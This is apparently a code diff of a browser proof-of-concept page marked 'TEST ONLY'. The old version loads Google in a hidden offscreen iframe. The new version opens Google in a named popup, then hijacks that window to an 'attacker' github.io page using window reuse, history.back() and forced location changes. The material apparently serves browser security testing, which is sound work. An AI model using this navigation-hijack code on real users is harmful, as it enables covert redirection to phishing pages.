@@ -1,45 +1,116 @@
 <!doctype html>
 <html lang="id">
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PoC: hidden iframe load (TEST ONLY)</title>
-<style>body{font-family:system-ui;padding:18px;background:#fff}button{padding:8px 12px;background:#0b66ff;color:#fff;border:0;border-radius:6px}</style>
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>PoC Try Back (TEST ONLY)</title>
+<style>
+  body{font-family:system-ui,sans-serif;padding:14px;background:#f6f8fb}
+  button{padding:8px 12px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
+  #log{white-space:pre-wrap;background:#111;color:#e6f0ff;padding:10px;border-radius:8px;margin-top:10px;max-height:240px;overflow:auto}
+  label{margin-right:8px}
+</style>
 </head>
 <body>
-  <h3>PoC — hidden iframe load then remove (TEST ONLY)</h3>
-  <p>Jika target menolak embedding (X-Frame-Options), iframe akan gagal — itu normal.</p>
-
-  <label>Delay remove (ms): <input id="delay" type="number" value="200" style="width:80px"></label>
-  <button id="run">Run</button>
-  <pre id="log">LOG: ready</pre>
+  <h3>PoC — Try programmatic BACK (TEST ONLY)</h3>
+  <div>
+    <label>delayOpen (ms): <input id="delayOpen" type="number" value="300" style="width:80px"></label>
+    <label>delayReturn (ms): <input id="delayReturn" type="number" value="1500" style="width:80px"></label>
+    <button id="run">Run</button>
+    <button id="abort">Abort</button>
+  </div>
+  <div id="log">LOG: ready</div>
 
 <script>
 const runBtn = document.getElementById('run');
+const abortBtn = document.getElementById('abort');
 const logEl = document.getElementById('log');
-function log(s){ logEl.textContent += '\\n' + s; logEl.scrollTop = 1e9; }
+
+let winRef = null;
+let timers = [];
+
+function log(msg){
+  const t = new Date().toISOString().slice(11,23);
+  logEl.textContent += `\n[${t}] ${msg}`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function clearAll(){
+  timers.forEach(t=>clearTimeout(t));
+  timers = [];
+  try{ if (winRef && !winRef.closed) winRef.close(); } catch(e){}
+  winRef = null;
+}
 
 runBtn.addEventListener('click', () => {
-  const delay = Math.max(0, parseInt(document.getElementById('delay').value||"200",10));
-  log('[*] Creating hidden iframe and navigating to google...');
-  const ifr = document.createElement('iframe');
-  ifr.style.width = '1px';
-  ifr.style.height = '1px';
-  ifr.style.position = 'fixed';
-  ifr.style.left = '-9999px';
-  ifr.style.top = '-9999px';
-  ifr.sandbox = ''; // optional: try without sandbox first; sandbox may prevent loads
-  document.body.appendChild(ifr);
-  // set src after append to trigger navigation
-  ifr.src = 'https://www.google.com/';
-  log('[+] iframe appended and src set to google');
+  clearAll();
+  log('=== START sequence (TEST ONLY) ===');
+  const delayOpen = Math.max(0, parseInt(document.getElementById('delayOpen').value||"300",10));
+  const delayReturn = Math.max(0, parseInt(document.getElementById('delayReturn').value||"1500",10));
+  const google = 'https://www.google.com/';
+  const attacker = 'https://mohammedalqi.github.io/';
 
-  setTimeout(() => {
+  try {
+    winRef = window.open(google, 'x'); // open google in named window 'x'
+    if (!winRef) { log('window.open returned null (popup blocked).'); return; }
+    log('opened Google in popup (name="x")');
+  } catch(e){
+    log('window.open error: ' + e);
+    return;
+  }
+
+  // open attacker in same window after delayOpen
+  timers.push(setTimeout(()=>{
     try {
-      document.body.removeChild(ifr);
-      log(`[+] iframe removed after ${delay} ms`);
-    } catch(e) {
-      log('[!] iframe remove failed: ' + e);
+      window.open(attacker, 'x'); // reuse same name
+      log(`after ${delayOpen}ms: opened attacker in same window (reuse 'x')`);
+    } catch(e){
+      log('open attacker error: ' + e);
     }
-  }, delay);
+  }, delayOpen));
+
+  // after delayOpen + delayReturn try programmatic back; fallback to navigate, fallback to close
+  timers.push(setTimeout(()=>{
+    if (!winRef || winRef.closed) { log('target window not available (closed)'); return; }
+    log(`after ${delayOpen + delayReturn}ms: attempting winRef.history.back()`);
+    try {
+      // best-effort: may throw or be no-op depending on browser
+      winRef.history.back();
+      log('called winRef.history.back() (observe behavior on the opened window)');
+      // give it a short time to take effect; if nothing, fallback below after 300ms
+      timers.push(setTimeout(() => {
+        try {
+          // attempt to check if still same-origin by reading location (may throw)
+          let loc;
+          try { loc = winRef.location.href; log('post-back: winRef.location.href = ' + loc); }
+          catch(e){ log('post-back: cannot read winRef.location (cross-origin or blocked): ' + e); }
+
+          // If cross-origin read blocked, still fallback to navigation-to-attacker to force return
+          log('fallback: setting winRef.location.href = attacker (best-effort)');
+          try { winRef.location.href = attacker; log('set location.href to attacker'); }
+          catch(e){ log('setting location.href blocked: ' + e + ' — trying close()'); try { winRef.close(); log('closed window as last fallback'); } catch(e2){ log('close() failed: ' + e2); } }
+        } catch(e2){
+          log('unexpected error in fallback: ' + e2);
+        }
+      }, 300));
+    } catch(err){
+      log('history.back() threw/blocked: ' + err);
+      // fallback immediately: navigate to attacker
+      try {
+        winRef.location.href = attacker;
+        log('fallback: set winRef.location.href = attacker');
+      } catch(e){
+        log('fallback navigate blocked: ' + e + ' — trying close()');
+        try { winRef.close(); log('closed window as final fallback'); }
+        catch(e2){ log('final fallback close() failed: ' + e2); }
+      }
+    }
+  }, delayOpen + delayReturn));
+});
+
+abortBtn.addEventListener('click', () => {
+  clearAll();
+  log('ABORTED: timers cleared and popup closed (if present)');
 });
 </script>
 </body>
